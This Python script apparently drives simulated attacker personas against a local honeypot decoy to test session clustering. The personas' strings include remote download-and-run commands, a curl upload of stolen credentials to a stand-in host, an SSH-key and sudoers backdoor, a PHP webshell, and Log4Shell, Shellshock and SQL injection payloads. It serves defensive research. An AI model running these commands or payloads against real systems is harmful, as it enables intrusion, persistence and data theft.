"""Live attack range: simulated attackers with different habits hit a running decoy.

Start the decoy first (python decoy_server.py --tarpit), from the folder that holds its data, then:
    python -m scripts.live_range                 # two waves, pause between them, scoreboard
    python -m scripts.live_range --no-pause      # waves back to back
    python -m scripts.live_range --waves 1       # one wave (what the dashboard's Launch button runs)
    python -m scripts.live_range --personas dropper,miner,sqli --per-persona 3 --reuse-ips 0.3

Every session comes from its own, never-used loopback address (127.x.y.z). Everything that does not define
an attacker is random on every run (addresses, usernames, passwords, the dropper's server, how many
sessions each attacker opens); what defines an attacker (its commands and rhythm) is fixed, so the same
attacker is recognised across waves and runs. --seed replays a run.

Nothing is ever overwritten. Each run adds a line per session to range_truth.csv and writes its own
range_runs/<run id>.json; the decoy appends to its telemetry, auth and alert files.

These are scripted attackers written for the demo. They show the mechanism working; they are not
evidence of accuracy on real attackers (see docs/paper).
"""
import argparse
import csv
import http.client
import json
import os
import random
import socket
import sys
import threading
import time
import urllib.parse
from datetime import datetime

import paramiko
import pandas as pd
from rich.console import Console
from rich.table import Table
from sklearn.metrics import adjusted_rand_score

console = Console(width=150, highlight=False)
LOCK = threading.Lock()
OUTCOMES = {}   # source ip -> what happened to that session


def say(color, who, msg):
    with LOCK:
        console.print(f"[{color}]{who:<28}[/] {msg}")


# ---- randomised, non-identifying details -----------------------------------------------------------
COMMON_PW = ["123456", "password", "admin", "root", "toor", "12345678", "ubuntu", "1234", "qwerty"]  # accepted at once
USERS = ["root", "admin", "ubuntu", "pi", "user", "test", "oracle"]
WORDS = ["hunter", "letmein", "Winter", "Summer", "dragon", "monkey", "shadow", "Passw0rd", "master", "trustno"]


def fresh_ips(n, taken):
    """n random loopback addresses nobody has used: not in `taken` (this run and earlier runs' logs)."""
    out = []
    while len(out) < n:
        ip = f"127.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(2, 254)}"
        if ip not in taken:
            taken.add(ip)
            out.append(ip)
    return out


def used_ips(folder):
    """Source IPs the decoy already recorded in this folder, so a new run never reuses one by accident."""
    taken = {"127.0.0.1"}
    for name in ("sessions.csv", "auth.csv", "telemetry.csv", "signals.csv", "range_truth.csv"):
        try:
            taken |= set(pd.read_csv(os.path.join(folder, name), usecols=["source_ip"])["source_ip"])
        except (OSError, ValueError):
            pass
    return taken


def staging():
    """A fake attacker staging server (documentation address range)."""
    return f"203.0.113.{random.randint(2, 250)}"


# ---- personas ---------------------------------------------------------------------------------
# think(i, latency) = the pause the attacker's own tooling makes after receiving response i-1. The
# decoy measures this pause net of the delay it injected itself.
class Persona:
    key, label, color, kind, shell = "", "", "white", "ssh", True
    cmds: list = []

    def prepare(self):
        """Once per run: pick the run-level details that are not part of the attacker's identity."""

    def creds(self):
        """Once per session: usernames and passwords tried (the first accepted)."""
        return [(random.choice(USERS), random.choice(COMMON_PW))]

    def think(self, i, latency):
        raise NotImplementedError

    def planned(self):
        return len(self.cmds)


class Dropper(Persona):
    key, label, color = "dropper", "Botnet dropper: fast script that fetches and runs a binary", "red"

    def prepare(self):   # the botnet's server changes between runs, but not between its own sessions
        h = staging()
        a, b = random.sample(["bins.sh", "arm7", "x86", "mips", "update.sh", "kworker", "sshd.bin"], 2)
        self.cmds = ["uname -a", "cd /tmp", f"wget http://{h}/{a}", f"chmod 777 {a}", "ls -la", "id",
                     "cat /proc/cpuinfo | grep name | wc -l", "free -m", "ps aux | grep -v grep | grep miner",
                     "crontab -l", "cd /var/tmp", f"wget http://{h}/{b}", f"chmod +x {b}", "ls", "whoami",
                     "cat /etc/passwd", "uname -m", "df -h", "cd /tmp", "ls -la", f"./{a}",
                     f"nohup ./{b} > /dev/null 2>&1 &", f'echo "*/5 * * * * /tmp/{a}" > /tmp/c', "crontab /tmp/c",
                     f"rm -f {a}", "ls /tmp", "history -c", "uptime", "w", "ps aux"]

    def think(self, i, latency):
        return 0.004 + random.random() * 0.004


class Scanner(Persona):
    key, label, color = "scanner", "Patient recon scanner: reads the system slowly, changes nothing", "cyan"
    cmds = ["uname -a", "cat /etc/os-release", "hostname", "whoami", "id", "w", "last", "ls /", "ls /etc",
            "cat /etc/passwd", "cat /etc/hosts", "ifconfig", "netstat -tulpn", "ps aux", "df -h", "uptime",
            "env", "ls /home", "ls /var/www", "date", "ls /var/log", "cat /etc/issue", "lscpu", "mount", "ip a",
            "ss -tulpn", "cat /etc/resolv.conf", "ls /opt"]

    def think(self, i, latency):
        return 0.5


class TwinFast(Persona):
    """Same commands as the scanner; only the rhythm differs. Text alone cannot tell them apart."""
    key, label, color = "twin_fast", "Twin of the scanner: identical commands, fast rhythm", "bright_red"
    cmds = Scanner.cmds

    def think(self, i, latency):
        return 0.006 + random.random() * 0.004


class Adaptive(Persona):
    key, label, color = "adaptive", "Backoff-aware bot: pauses longer when responses are slow", "yellow"
    cmds = ["whoami", "uname -a", "ls -la", "cat ~/.aws/credentials", "cat /etc/shadow", "ps aux", "ls /var/www",
            "cat /var/www/.env", "ls -la ~/.ssh", "cat ~/.ssh/authorized_keys", "history", "ls /opt", "env",
            "cat /etc/crontab", "find / -name id_rsa", "ls /root", "id", "pwd", "ls -la /tmp", "date",
            "cat /var/www/wp-config.php", "ls /etc/apache2", "cat ~/.bash_history", "ls /var/backups",
            "cat /etc/hosts", "mount", "ls -la /home", "uname -r"]

    def creds(self):   # two wordlist guesses are rejected, the third attempt from the address is accepted
        user = random.choice(USERS)
        return [(user, random.choice(WORDS) + str(random.randint(10, 99))) for _ in range(3)]

    def think(self, i, latency):
        return 0.04 + 0.6 * latency   # the bot's pause grows with the latency it sees


class Operator(Persona):
    key, label, color = "operator", "Human-style operator: explores by hand, irregular pauses", "green"
    cmds = ["ls", "pwd", "whoami", "ls -la", "cd /var/www", "ls", "cat .env", "cd ..", "cat /etc/passwd", "ps aux",
            "ls /home", "cd /tmp", "touch test", "ls -la", "uname -a", "df -h", "history", "ls -la /var/log", "id",
            "ls /opt", "cat /etc/hostname", "ls -la /etc", "cd /var/log", "ls", "tail /var/log/auth.log",
            "cat /etc/os-release", "cd ~", "ls -la"]

    def think(self, i, latency):
        return min(max(random.lognormvariate(0.0, 0.45), 0.3), 4.0)


class Miner(Persona):
    key, label, color = "miner", "Crypto-miner installer: kills rivals, installs a miner, persists", "bright_yellow"

    def prepare(self):
        h = staging()
        self.cmds = ["nproc", "cat /proc/cpuinfo | grep -c processor", "free -m",
                     'ps aux | grep -E "xmr|minerd|kdevtmpfsi"', "pkill -f kdevtmpfsi", "pkill -f minerd",
                     "netstat -tulpn | grep 3333", "cd /tmp", f"curl -s http://{h}/xmrig.tar.gz -o x.tgz",
                     "tar xzf x.tgz", "chmod +x xmrig", "ls -la", 'echo "pool=pool.example:4444" > config.json',
                     "cat config.json", "nohup ./xmrig -c config.json > /dev/null 2>&1 &", "ps aux | grep xmrig",
                     'echo "@reboot /tmp/xmrig" > c.txt', "crontab c.txt", "crontab -l", "uptime", "w", "df -h",
                     "ls /tmp", "cat /etc/passwd | wc -l", "whoami", "id", "history -c", "rm -f x.tgz", "ls"]

    def think(self, i, latency):
        return 0.10 + random.random() * 0.04


class Implanter(Persona):
    key, label, color = "implanter", "Persistence implanter: plants an SSH key, a backdoor user and a cron job", "bright_magenta"

    def prepare(self):
        h = staging()
        self.cmds = ["whoami", "id", "mkdir -p ~/.ssh", "ls -la ~/.ssh",
                     'echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7 attacker@kali" >> ~/.ssh/authorized_keys',
                     "chmod 700 ~/.ssh", "chmod 600 ~/.ssh/authorized_keys", "cat ~/.ssh/authorized_keys",
                     "useradd -m -s /bin/bash support", 'echo "support:Passw0rd!" | chpasswd',
                     'echo "support ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers', "cat /etc/sudoers", "id support",
                     "cat /etc/passwd | grep support", f'echo "* * * * * root curl -s http://{h}/b | sh" >> /etc/crontab',
                     "cat /etc/crontab", "ls -la /etc/cron.d", "touch /etc/ld.so.preload", "ls /root", "ls -la /tmp",
                     "uname -a", "hostname", "ifconfig", "netstat -tulpn", "ps aux | grep sshd", "history -c",
                     "ls /var/log", "date", "pwd"]

    def think(self, i, latency):
        return 0.25 * random.uniform(0.85, 1.15)


class Harvester(Persona):
    key, label, color = "harvester", "Data thief: reads bait credentials and keys, packs and uploads them", "bright_cyan"

    def prepare(self):
        self.cmds = ["cat ~/.aws/credentials", "cat /etc/shadow", "cat ~/.ssh/id_rsa", "cat /var/www/.env",
                     "cat /var/www/wp-config.php", 'find / -name "*.pem"', 'find / -name "id_rsa"', "ls /var/backups",
                     "ls -la /home", "cat ~/.bash_history", "env | grep -i key", "env | grep -i pass", "ls /var/www",
                     "ls /var/www/html", "cat /etc/mysql/my.cnf", "ls /etc/mysql",
                     "tar czf /tmp/loot.tgz /var/www /etc/mysql", "ls -la /tmp/loot.tgz", "base64 /tmp/loot.tgz | head",
                     f"curl -F f=@/tmp/loot.tgz http://{staging()}/up", "rm -f /tmp/loot.tgz", "history -c",
                     "cat /etc/passwd", "ls /root", "id", "pwd", "date", "uname -a"]

    def think(self, i, latency):   # bursts of reads separated by a long pause: a batched script
        return 1.0 if i % 4 == 0 else 0.02


class Stuffer(Persona):
    key, label, color, shell = "stuffer", "Credential stuffer: guesses passwords, never runs a command", "white", False

    def creds(self):
        user = random.choice(USERS)
        return [(user, random.choice(WORDS) + str(random.randint(10, 99))) for _ in range(3)]


class Web(Persona):
    kind = "http"
    reqs: list = []

    def planned(self):
        return len(self.reqs)

    def think(self, i, latency):
        return 0.15


class WebScanner(Web):
    key, label, color = "webscan", "WordPress / .env web scanner", "magenta"
    reqs = [("GET", p, None, {}) for p in [
        "/", "/wp-login.php", "/wp-admin/", "/.env", "/phpmyadmin/", "/admin", "/login", "/xmlrpc.php",
        "/wp-content/", "/backup.zip", "/.git/config", "/server-status", "/config.php", "/robots.txt",
        "/index.php", "/wp-json/", "/administrator/", "/cgi-bin/", "/wp-config.php.bak", "/.aws/credentials",
        "/db.sql", "/test.php"]]

    def think(self, i, latency):   # a crawler that pauses after every third request
        return 0.9 if i % 3 == 0 else 0.05


class SqlInjector(Web):
    key, label, color = "sqli", "Injection prober: SQL injection, path traversal and XSS payloads", "bright_blue"
    reqs = [("GET", p, None, {}) for p in [
        "/index.php?id=1", "/index.php?id=1'", "/index.php?id=1 AND 1=1", "/index.php?id=1 AND 1=2",
        "/index.php?id=1 UNION SELECT NULL,NULL", "/index.php?id=1 UNION SELECT user(),version()",
        "/product.php?id=-1 UNION SELECT 1,2,3--", "/search.php?q=' OR '1'='1", "/page.php?file=../../../../etc/passwd",
        "/page.php?file=....//....//etc/passwd", "/page.php?file=/etc/passwd%00",
        "/view.php?page=php://filter/convert.base64-encode/resource=index", "/download.php?f=../../wp-config.php",
        "/search?q=<script>alert(1)</script>", "/comment.php?msg=<img src=x onerror=alert(1)>", "/admin.php?cmd=id",
        "/cmd.php?c=whoami", "/index.php?id=1;SELECT SLEEP(5)", "/index.php?id=1' AND SLEEP(5)--",
        "/item.php?id=1 ORDER BY 10--", "/login.php?user=admin'--", "/api/user?id=1 OR 1=1",
        "/news.php?id=1' UNION ALL SELECT 1--", "/index.php?id=0x31"]]

    def think(self, i, latency):
        return 0.9


class WpBrute(Web):
    key, label, color = "wpbrute", "WordPress login brute-forcer: posts many passwords to wp-login.php", "bright_green"

    def prepare(self):
        pws = random.sample(["admin", "123456", "password", "letmein", "welcome1", "qwerty", "dragon", "monkey",
                             "football", "iloveyou", "Passw0rd", "changeme", "wordpress", "admin123", "root"], 12)
        user = random.choice(["admin", "administrator", "editor", "webmaster"])
        form = {"Content-Type": "application/x-www-form-urlencoded"}

        def post(pw):
            return ("POST", "/wp-login.php", urllib.parse.urlencode({"log": user, "pwd": pw, "wp-submit": "Log In"}), form)

        self.reqs = [("GET", "/wp-login.php", None, {}), ("GET", "/xmlrpc.php", None, {})] + \
                    [post(pw) for pw in pws] + [post(pw) for pw in random.sample(pws, 6)]

    def think(self, i, latency):   # rate-limit aware: backs off in proportion to the delay it sees
        return 0.02 + 0.8 * latency


class Prober(Web):
    key, label, color = "prober", "Exploit prober: Log4Shell, Shellshock and IoT/CMS exploit paths", "bright_white"

    def prepare(self):
        h = staging()
        jndi = {"X-Api-Version": "${jndi:ldap://" + h + "/a}"}
        shock = {"User-Agent": "() { :; }; echo; /bin/cat /etc/passwd"}
        self.reqs = [("GET", "/", None, jndi), ("GET", "/cgi-bin/status", None, shock), ("GET", "/cgi-bin/test.cgi", None, shock)] + \
                    [("GET", p, None, {}) for p in [
                        "/manager/html", "/actuator/env", "/actuator/health", "/solr/admin/info/system", "/jenkins/script",
                        "/console", "/api/v1/pods", "/_ignition/execute-solution",
                        "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "/boaform/admin/formLogin",
                        "/GponForm/diag_Form?images/", "/HNAP1/", "/setup.cgi?next_file=netgear.cfg",
                        f"/shell?cd+/tmp;rm+-rf+*;wget+http://{h}/j", "/owa/auth/logon.aspx", "/remote/login",
                        "/+CSCOE+/logon.html", "/server-info"]]

    def think(self, i, latency):
        return 0.03


class IotBot(Persona):
    key, label, color = "iotbot", "Mirai-style Telnet bot: default passwords, builds its binary with echo, runs it", "bright_red"
    kind = "telnet"

    def prepare(self):   # the botnet's binary changes between runs, not between its own sessions
        blob = bytes([0x7F, 0x45, 0x4C, 0x46, 2, 1, 1, 0]) + bytes(random.randrange(256) for _ in range(504))   # 512 bytes in 16-byte echo lines, like a real dropper
        chunks = [blob[i:i + 16] for i in range(0, len(blob), 16)]
        esc = lambda b: "".join(f"\\x{x:02x}" for x in b)
        name = random.choice([".d", ".x", "dvrHelper", ".kworker"])
        self.cmds = (["enable", "system", "shell", "sh", "/bin/busybox ZORRO", "cd /tmp", "cat /proc/mounts"]
                     + [f'echo -ne "{esc(c)}" {">>" if i else ">"} {name}' for i, c in enumerate(chunks)]
                     + [f"chmod 777 {name}", f"./{name}", "/bin/busybox ZORRO", f"rm -f {name}", "ls /tmp"])

    def creds(self):   # Mirai's built-in list: two defaults the decoy refuses, then one it accepts
        return [("root", random.choice(["xc3511", "vizxv", "juantech", "xmhdipc"])),
                ("root", random.choice(["Zte521", "7ujMko0admin", "hunt5759"])), ("admin", "admin")]

    def think(self, i, latency):
        return 0.01 + random.random() * 0.01


class Webshell(Web):
    key, label, color = "webshell", "Webshell uploader: PUTs and posts a PHP shell, then runs commands through it", "bright_magenta"

    def prepare(self):
        tag = bytes(random.choice(b"abcdef0123456789") for _ in range(24))
        shell = b"<?php if(isset($_REQUEST['c'])){system($_REQUEST['c']);} // " + tag + b" ?>"
        boundary = "----cerda" + "".join(random.choice("0123456789abcdef") for _ in range(12))
        head = (f'--{boundary}\r\nContent-Disposition: form-data; name="file"; filename="img.php.jpg"\r\n'
                "Content-Type: image/jpeg\r\n\r\n")
        multipart = head.encode() + shell + f"\r\n--{boundary}--\r\n".encode()
        self.reqs = [("GET", "/", None, {}), ("PUT", "/uploads/s.php", shell, {}),
                     ("POST", "/wp-content/plugins/up/upload.php", multipart,
                      {"Content-Type": f"multipart/form-data; boundary={boundary}"})] + \
                    [("GET", f"/uploads/s.php?c={c}", None, {}) for c in ("id", "uname+-a", "ls+/", "cat+/etc/passwd", "whoami")]

    def think(self, i, latency):
        return 0.2


class Tunneler(Persona):
    key, label, color = "tunneler", "Proxy abuser: uploads a tool over SFTP, relays SMTP/web traffic through the box", "bright_green"
    kind = "tunnel"

    def prepare(self):   # the tool and the relay targets change between runs, not between its own sessions
        self.blob = b"#!/bin/sh\n# " + bytes(random.choice(b"abcdef0123456789") for _ in range(80)) + b"\n./relay &\n"
        self.drop = random.choice(["/tmp/.relay.sh", "/tmp/.p", "/var/tmp/.rc"])
        victim = random.choice(["mail.victim-a.example", "mx.victim-b.example", "smtp.victim-c.example"])
        self.targets = [(victim, 25), (victim, 587), ("login.victim-d.example", 443)]
        self.cmds = ["uname -a", "id", "ls -la /tmp", "cat /etc/passwd"]

    def planned(self):
        return len(self.cmds)   # only the shell commands count: the upload and relays are not decoy 'commands'

    def think(self, i, latency):
        return 0.15


ALL = {p.key: p for p in (Dropper(), Scanner(), Adaptive(), Operator(), Miner(), Implanter(), Harvester(), Stuffer(),
                          WebScanner(), SqlInjector(), WpBrute(), Prober(), IotBot(), Webshell(), Tunneler(), TwinFast())}
DEFAULT_KEYS = [k for k in ALL if k != "twin_fast"]


# ---- clients ----------------------------------------------------------------------------------
def read_until_prompt(chan, timeout=15.0):
    """Output up to the next prompt, or None if the server dropped the connection."""
    buf, deadline = b"", time.time() + timeout
    while time.time() < deadline and not buf.endswith((b"# ", b"$ ")):
        if chan.recv_ready():
            buf += chan.recv(4096)
        elif chan.closed or chan.eof_received or not chan.get_transport().is_active():
            return None
        else:
            time.sleep(0.005)
    return buf


def run_ssh(p, src, port):
    who = f"{p.key}@{src}"
    planned, sent, outcome = p.planned(), 0, "completed"
    try:
        logged, transport = False, None
        for user, pw in p.creds():
            try:
                sock = socket.create_connection(("127.0.0.1", port), source_address=(src, 0), timeout=15)
                transport = paramiko.Transport(sock)
                transport.connect()
            except (paramiko.SSHException, OSError, EOFError):
                OUTCOMES[src] = dict(persona=p.key, planned=planned, sent=0, outcome="refused at connect")
                say(p.color, who, "refused at connect (address banned)")
                return
            try:
                transport.auth_password(user, pw)
                say(p.color, who, f"logged in as {user}:{pw}" if p.shell else f"guessed {user}:{pw}")
                logged = True
                break
            except paramiko.AuthenticationException:
                say(p.color, who, f"rejected {user}:{pw}")
                transport.close()
        if not logged:
            outcome = "login failed"
        elif not p.shell:
            transport.close()
            outcome = "logged in, left"
        else:
            chan = transport.open_session()
            chan.get_pty()
            chan.invoke_shell()
            read_until_prompt(chan)
            latency = 0.0
            for i, cmd in enumerate(p.cmds):
                if i:
                    time.sleep(p.think(i, latency))
                t0 = time.time()
                chan.send(cmd + "\n")
                if read_until_prompt(chan) is None:
                    break
                sent += 1
                latency = time.time() - t0
            outcome = "completed" if sent == planned else f"cut after {sent}"
            if outcome == "completed":
                chan.send("exit\n")
            transport.close()
    except (paramiko.SSHException, OSError, EOFError):
        outcome = f"cut after {sent}"
    OUTCOMES[src] = dict(persona=p.key, planned=planned, sent=sent, outcome=outcome)
    say(p.color, who, outcome + (f" of {planned} commands" if p.shell and outcome.startswith("cut") else ""))


def run_telnet(p, src, port):
    """Raw-socket Telnet client: answers the login prompts, then sends commands and waits for the prompt."""
    who = f"{p.key}@{src}"
    planned, sent, outcome = p.planned(), 0, "completed"

    def read_until(sock, endings, timeout=15.0):
        buf, deadline = b"", time.time() + timeout
        while time.time() < deadline and not buf.endswith(endings):
            try:
                chunk = sock.recv(4096)
            except socket.timeout:
                continue
            if not chunk:
                return None
            buf += chunk
        return buf

    try:
        sock = socket.create_connection(("127.0.0.1", port), source_address=(src, 0), timeout=2)
        logged = False
        for user, pw in p.creds():
            if read_until(sock, (b"login: ",)) is None:
                raise ConnectionError
            sock.sendall(user.encode() + b"\r\n")
            read_until(sock, (b"Password: ",))
            sock.sendall(pw.encode() + b"\r\n")
            reply = read_until(sock, (b"login: ", b"# ", b"$ "))
            if reply is None:
                raise ConnectionError
            if reply.endswith((b"# ", b"$ ")):
                say(p.color, who, f"logged in as {user}:{pw}")
                logged = True
                break
            say(p.color, who, f"rejected {user}:{pw}")
        if not logged:
            outcome = "login failed"
        else:
            latency = 0.0
            for i, cmd in enumerate(p.cmds):
                if i:
                    time.sleep(p.think(i, latency))
                t0 = time.time()
                sock.sendall(cmd.encode() + b"\r\n")
                if read_until(sock, (b"# ", b"$ ")) is None:
                    break
                sent += 1
                latency = time.time() - t0
            outcome = "completed" if sent == planned else f"cut after {sent}"
        sock.close()
    except (OSError, ConnectionError):
        outcome = f"cut after {sent}" if sent else "refused at connect"
    OUTCOMES[src] = dict(persona=p.key, planned=planned, sent=sent, outcome=outcome)
    say(p.color, who, outcome + (f" of {planned} commands" if outcome.startswith("cut") else ""))


def run_tunnel(p, src, port):
    """paramiko client: SFTP upload, `ssh -L`-style relays (direct-tcpip), then commands over an exec channel."""
    import io
    who = f"{p.key}@{src}"
    planned, sent, outcome = p.planned(), 0, "completed"
    transport = None
    try:
        sock = socket.create_connection(("127.0.0.1", port), source_address=(src, 0), timeout=15)
        transport = paramiko.Transport(sock)
        transport.connect()
        user, pw = p.creds()[0]
        transport.auth_password(user, pw)
        say(p.color, who, f"logged in as {user}:{pw}")
        sftp = paramiko.SFTPClient.from_transport(transport)
        sftp.putfo(io.BytesIO(p.blob), p.drop)
        sftp.close()
        for host, dport in p.targets:
            time.sleep(p.think(0, 0))
            chan = transport.open_channel("direct-tcpip", (host, dport), ("127.0.0.1", 0), timeout=10)
            chan.send(f"EHLO relay.example\r\nMAIL FROM:<x@{host}>\r\n".encode())
            chan.close()
        chan = transport.open_session()   # one exec channel, like `ssh host "cmd; cmd"`: one decoy session
        chan.exec_command("; ".join(p.cmds))
        while chan.recv(65536):
            pass
        chan.close()
        sent += len(p.cmds)
    except (paramiko.SSHException, OSError, EOFError):
        outcome = f"cut after {sent}" if sent else "refused at connect"
    if transport is not None:
        transport.close()
    OUTCOMES[src] = dict(persona=p.key, planned=planned, sent=sent, outcome=outcome)
    say(p.color, who, outcome + (f" of {planned} steps" if outcome.startswith("cut") else ""))


def run_http(p, src, port):
    who = f"{p.key}@{src}"
    planned, sent = p.planned(), 0
    conn = http.client.HTTPConnection("127.0.0.1", port, source_address=(src, 0), timeout=15)
    latency = 0.0
    try:
        for i, (method, path, body, headers) in enumerate(p.reqs):
            if i:
                time.sleep(p.think(i, latency))
            t0 = time.time()
            h = {"User-Agent": "Mozilla/5.0 (compatible; scan)"}
            h.update(headers)
            conn.request(method, urllib.parse.quote(path, safe="/?&=:;%+*@!$,'()<>"), body, h)
            conn.getresponse().read()
            sent += 1
            latency = time.time() - t0
        outcome = "completed"
    except (http.client.HTTPException, OSError):
        outcome = f"cut after {sent}" if sent else "refused at connect"
    conn.close()
    OUTCOMES[src] = dict(persona=p.key, planned=planned, sent=sent, outcome=outcome)
    say(p.color, who, outcome + (f" of {planned} requests" if outcome.startswith("cut") else ""))


def guarded(fn, p, src, port):
    try:
        fn(p, src, port)
    except Exception as e:   # one broken session must not stop the wave
        OUTCOMES[src] = dict(persona=p.key, planned=p.planned(), sent=0, outcome=f"error: {type(e).__name__}")
        say("red", f"{p.key}@{src}", f"error: {e!r}")


# ---- waves ------------------------------------------------------------------------------------
def earlier_ips(folder):
    """{persona: [ips]} from earlier runs, so some attackers can come back from an address that may now be banned."""
    try:
        d = pd.read_csv(os.path.join(folder, "range_truth.csv"))
        return d.groupby("persona")["source_ip"].apply(list).to_dict()
    except (OSError, ValueError, KeyError):
        return {}


def plan_wave(personas, per_persona, taken, reuse, earlier):
    """Per attacker: a random number of sessions (or per_persona), each on a never-used address, except a
    `reuse` share that comes back from an address used in an earlier run."""
    plan, in_wave = [], set()
    for p in personas:
        n = per_persona or random.randint(2, 4)
        for _ in range(n):
            pool = [ip for ip in earlier.get(p.key, []) if ip not in in_wave]
            ip = random.choice(pool) if pool and random.random() < reuse else fresh_ips(1, taken)[0]
            in_wave.add(ip)
            plan.append((p, ip))
    return plan


def run_wave(title, plan, ports):
    console.rule(f"[bold]{title}")
    truth, threads = {}, []
    for p, src in plan:
        truth[src] = p.key
        fn = {"ssh": run_ssh, "http": run_http, "telnet": run_telnet, "tunnel": run_tunnel}[p.kind]
        port = ports["ssh" if p.kind == "tunnel" else p.kind]
        threads.append(threading.Thread(target=guarded, args=(fn, p, src, port), daemon=True))
    random.shuffle(threads)
    for t in threads:
        t.start()
        time.sleep(random.uniform(0.2, 0.8))
    for t in threads:
        t.join()
    return truth


def read_sessions(path):
    try:
        return pd.read_csv(path)
    except (OSError, ValueError, pd.errors.EmptyDataError):
        return pd.DataFrame(columns=["session_id", "source_ip", "num_commands", "threat_actor_id", "cerf"])


def wait_for_analysis(path, expect, timeout=75):
    """Wait until the decoy's analytics (every few seconds) has clustered every session we expect and stopped changing."""
    deadline, last, stable = time.time() + timeout, None, 0
    while time.time() < deadline:
        d = read_sessions(path)
        d = d[d["source_ip"].isin(expect)]
        sig = tuple(sorted(zip(d["source_ip"], d["num_commands"], d["threat_actor_id"])))
        stable = stable + 1 if (sig == last and set(d["source_ip"]) >= expect) else 0
        last = sig
        if stable >= 2:
            break
        time.sleep(3.5)
    return read_sessions(path)


def append_truth(folder, run_id, wave, truth, started):
    path = os.path.join(folder, "range_truth.csv")
    new = not os.path.exists(path)
    with LOCK, open(path, "a", newline="", encoding="utf-8") as f:
        w = csv.writer(f)
        if new:
            w.writerow(["run_id", "wave", "source_ip", "persona", "planned", "sent", "outcome", "started"])
        for ip, key in truth.items():
            o = OUTCOMES.get(ip, {})
            w.writerow([run_id, wave, ip, key, o.get("planned", ""), o.get("sent", ""), o.get("outcome", ""), started])


def scoreboard(df, truth, title, before=frozenset()):
    df = df[df["source_ip"].isin(truth) & ~df["session_id"].isin(before)].assign(persona=lambda d: d["source_ip"].map(truth))
    t = Table(title=title)
    for c in ("Persona", "Source IP", "Cmds logged", "Outcome", "CERF hash", "Actor"):
        t.add_column(c)
    for _, r in df.sort_values(["persona", "source_ip"]).iterrows():
        o = OUTCOMES.get(r["source_ip"], {})
        t.add_row(r["persona"], r["source_ip"], f"{r['num_commands']}/{o.get('planned', '?')}", o.get("outcome", ""),
                  str(r["cerf"]), r["threat_actor_id"])
    console.print(t)


def auth_counts(folder, ips):
    try:
        a = pd.read_csv(os.path.join(folder, "auth.csv"), usecols=["source_ip", "accepted"])
        a = a[a["source_ip"].isin(ips)]
        return len(a), int(a["accepted"].sum())
    except (OSError, ValueError):
        return 0, 0


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--ssh-port", type=int, default=2222)
    ap.add_argument("--http-port", type=int, default=8080)
    ap.add_argument("--telnet-port", type=int, default=2323)
    ap.add_argument("--data-dir", default=".", help="folder the decoy writes to (sessions.csv, auth.csv ...)")
    ap.add_argument("--waves", type=int, default=2)
    ap.add_argument("--no-pause", action="store_true")
    ap.add_argument("--personas", default=",".join(DEFAULT_KEYS), help="comma-separated attacker keys")
    ap.add_argument("--twins", action="store_true", help="add an attacker with the scanner's exact commands but a fast rhythm")
    ap.add_argument("--per-persona", type=int, default=0, help="sessions per attacker per wave (default: random 2-4)")
    ap.add_argument("--reuse-ips", type=float, default=0.0, help="share of sessions that return from an address used in an earlier run")
    ap.add_argument("--seed", type=int, default=None, help="replay an earlier run (the seed is printed at the start)")
    a = ap.parse_args()

    seed = a.seed if a.seed is not None else random.SystemRandom().randrange(10**6)
    random.seed(seed)
    keys = [k.strip() for k in a.personas.split(",") if k.strip()]
    if a.twins and "twin_fast" not in keys:
        keys.append("twin_fast")
    unknown = [k for k in keys if k not in ALL]
    if unknown:
        sys.exit(f"unknown attackers: {unknown}. Choose from {list(ALL)}")
    personas = [ALL[k] for k in keys]
    folder = os.path.abspath(a.data_dir)
    sessions_csv = os.path.join(folder, "sessions.csv")
    try:
        socket.create_connection(("127.0.0.1", a.ssh_port), timeout=3).close()
    except OSError:
        sys.exit(f"No decoy is listening on port {a.ssh_port}. Start it first: python decoy_server.py --tarpit")

    run_id = datetime.now().strftime("%Y%m%d-%H%M%S") + f"-s{seed}"
    console.print(f"[bold]CERDA live range[/]  run {run_id}   (seed {seed})")
    console.print("Scripted attackers, one new loopback address per session. Existing data is only ever added to.\n")
    for p in personas:
        p.prepare()
        console.print(f"  [{p.color}]{p.key:<10}[/] {p.label}")
    taken = used_ips(folder)
    earlier = earlier_ips(folder)
    all_before = set()
    truth_all, summary = {}, {"run_id": run_id, "seed": seed, "personas": keys, "waves": []}
    os.makedirs(os.path.join(folder, "range_runs"), exist_ok=True)

    for wave in range(1, a.waves + 1):
        title = "WAVE 1: attackers arrive" if wave == 1 else f"WAVE {wave}: the same attackers return from new addresses"
        started = datetime.now().isoformat(timespec="seconds")
        before = set(read_sessions(sessions_csv).get("session_id", []))   # sessions that existed before this wave
        plan = plan_wave(personas, a.per_persona, taken, a.reuse_ips, earlier)
        truth = run_wave(title, plan, {"ssh": a.ssh_port, "http": a.http_port, "telnet": a.telnet_port})
        truth_all.update(truth)
        append_truth(folder, run_id, wave, truth, started)
        expect = {ip for ip in truth if OUTCOMES.get(ip, {}).get("sent", 0) > 0}
        console.print("[dim]waiting for the decoy's analytics to cluster the sessions...[/]")
        d = wait_for_analysis(sessions_csv, expect)
        scoreboard(d, truth, f"After wave {wave}", before)
        all_before |= before
        summary["waves"].append({"wave": wave, "sessions": len(truth), "started": started})
        if wave < a.waves and not a.no_pause:
            input("\nPress Enter to send the SAME attackers back from NEW addresses... ")

    d = read_sessions(sessions_csv)
    d = d[d["source_ip"].isin(truth_all) & ~d["session_id"].isin(all_before)].assign(persona=lambda x: x["source_ip"].map(truth_all))
    cuts = sum(1 for o in OUTCOMES.values() if o["outcome"].startswith("cut"))
    refused = sum(1 for o in OUTCOMES.values() if o["outcome"].startswith("refused"))
    stuffer_ips = {ip for ip, k in truth_all.items() if k == "stuffer"}
    attempts, accepted = auth_counts(folder, stuffer_ips)
    console.print()
    console.print(f"sessions started: {len(truth_all)}   clustered: {len(d)}   actors found: {d['threat_actor_id'].nunique()}"
                  f"   cut by the defence: {cuts}   refused at connect: {refused}")
    if stuffer_ips:
        console.print(f"credential stuffers: {len(stuffer_ips)} addresses, {attempts} password attempts logged, {accepted} accepted")
    ari = None
    if d["persona"].nunique() > 1:
        ari = adjusted_rand_score(d["persona"], d["threat_actor_id"])
        console.print(f"adjusted Rand index of actors vs the true attackers (this run's sessions): {ari:.2f}")
    for key, g in d.groupby("persona"):
        console.print(f"  {key:<10} -> {', '.join(sorted(g['threat_actor_id'].unique()))}")
